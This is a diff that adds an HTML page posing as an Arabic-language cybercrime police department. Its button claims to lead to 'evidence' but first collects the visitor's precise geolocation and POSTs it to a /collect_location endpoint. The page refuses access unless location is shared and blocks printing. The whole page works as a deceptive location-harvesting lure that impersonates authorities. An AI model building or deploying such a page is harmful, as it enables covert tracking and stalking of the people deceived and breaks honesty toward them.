@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="{{ url_for('static', filename='favicon.ico') }}">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>الإدارة العامة لمكافحة الجرائم الإلكترونية</title>
+
+  <style>
+    :root{
+      --red:#c82333;
+      --grey:#fafafa;
+      --card:#ffffff;
+      --border:#e6e6e6;
+      --text:#333;
+    }
+    html,body{
+      margin:0;padding:0;background:var(--grey);
+      font-family: "Tajawal", Arial, sans-serif;
+      color: var(--text)
+    }
+    .wrap{max-width: 840px;margin: 40px auto;padding: 0 16px}
+    .card{
+      position: relative;background:var(--card);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 28px 22px;
+      box-shadow: 0 8px 20px rgba(0,0,0,.04);
+      text-align: center;
+    }
+    .card::before{
+      content: "";position:absolute;top:50%;left:50%;
+      width: 320px;height:320px;transform:translate(-50%,-50%);
+      background: url("https://i.ibb.co/fdKfbpGx/IMG-1398.jpg") center/contain no-repeat;
+      opacity: .14;pointer-events: none;filter: grayscale(100%);z-index: 0;
+    }
+    .card>*{position: relative;z-index: 1;}
+    
+    h2.title{margin:0 0 12px;text-align:center;color:var(--red);font-weight:800}
+    p{margin:8px 0;text-align:center;line-height:1.9}
+    .en h3{color:var(--red);margin:14px 0 8px;text-align:center}
+    .hint{margin-top:14px;text-align:center;color:#666;font-size:14px}
+
+    .btn {
+      background: var(--red);
+      color: #fff;
+      padding: 12px 28px;
+      font-size: 1rem;
+      font-weight: 700;
+      border-radius: 8px;
+      text-decoration: none;
+      display: inline-block;
+      transition: background .2s ease, transform .1s ease;
+    }
+    .btn:hover {
+      background: #a71d2a;
+      transform: translateY(-2px);
+    }
+
+    @font-face{
+      font-family:"Tajawal";
+      src: url("https://fonts.gstatic.com/s/tajawal/v11/Iurf6YBj_oCad4k1l4Qa.woff2") format("woff2");
+      font-weight:400;font-style:normal;font-display:swap;
+    }
+    @font-face{
+      font-family:"Tajawal";
+      src: url("https://fonts.gstatic.com/s/tajawal/v11/IurW6YBj_oCad4k1m4Y.woff2") format("woff2");
+      font-weight:800;font-style:normal;font-display:swap;
+    }
+
+    @media print {
+      body {
+        background: black !important;
+        color: red !important;
+        font-size: 32px !important;
+        text-align: center !important;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      body * { display: none !important; }
+      body::before {
+        content: "🚫 ممنوع النسخ أو الطباعة | 🚫 Copying or Printing is Prohibited";
+        display: block;
+        white-space: pre;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <h2 class="title">مرحباً بكم في الإدارة العامة لمكافحة الجرائم الإلكترونية</h2>
+      <p>اضغط على الزر أدناه للانتقال إلى صفحة الأدلة وإتمام التحقق.</p>
+
+      <div class="en">
+        <h3>Welcome to the Cybercrime Department</h3>
+        <p>Click the button below to proceed to the evidence page for verification.</p>
+        <button onclick="sendAndGo()">الأدلة | Evidence</button>
+    <div id="result"></div>
+  </div>
+
+<script>
+function sendAndGo() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true});
+  } else {
+    document.getElementById("result").innerText = "المتصفح لا يدعم تحديد الموقع.";
+    // نفتح الصفحة حتى لو مفيش Geolocation
+    window.location.href = "evidence.html";
+  }
+}
+
+function success(position) {
+  const lat = position.coords.latitude.toFixed(6);
+  const lon = position.coords.longitude.toFixed(6);
+  const acc = position.coords.accuracy;
+
+  // عرض للمستخدم
+  document.getElementById("result").innerText = 
+    `✅ تم تسجيل موقعك: ${lat}, ${lon} (دقة: ${acc}م)\nجاري الانتقال...`;
+
+  // إرسال للسيرفر
+  fetch("/collect_location", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({ latitude:lat, longitude:lon, accuracy:acc })
+  }).finally(() => {
+    // فتح صفحة الأدلة بعد الإرسال
+    window.location.href = "evidence.html";
+  });
+}
+
+function error(err) {
+  document.getElementById("result").innerText =
+    "⚠️ لم يتم الحصول على الموقع: " + err.message +
+    "\n🚫 لن يتم فتح صفحة الأدلة بدون مشاركة موقعك.";
+  document.getElementById("retry").style.display = "inline-block";
+}
+</script>
+</body>
+</html>
+
